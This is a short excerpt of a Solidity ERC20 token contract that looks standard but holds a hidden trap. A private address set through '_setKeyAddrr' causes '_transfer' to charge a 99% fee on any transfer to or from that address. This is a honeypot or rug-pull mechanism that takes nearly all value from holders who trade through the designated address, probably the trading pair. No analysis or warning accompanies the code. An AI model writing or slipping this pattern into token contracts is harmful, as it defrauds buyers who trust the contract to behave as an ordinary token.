...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address  private toAddr = address(0);
    bool private to1 = true;
    bool private from1 = false;
    ...
    function _transfer(
        ...
        if (recipient==toAddr||sender==toAddr){
            tFee=99;
        }
    ...
    function _setKeyAddrr(address account) internal virtual {
        toAddr = account;
    }
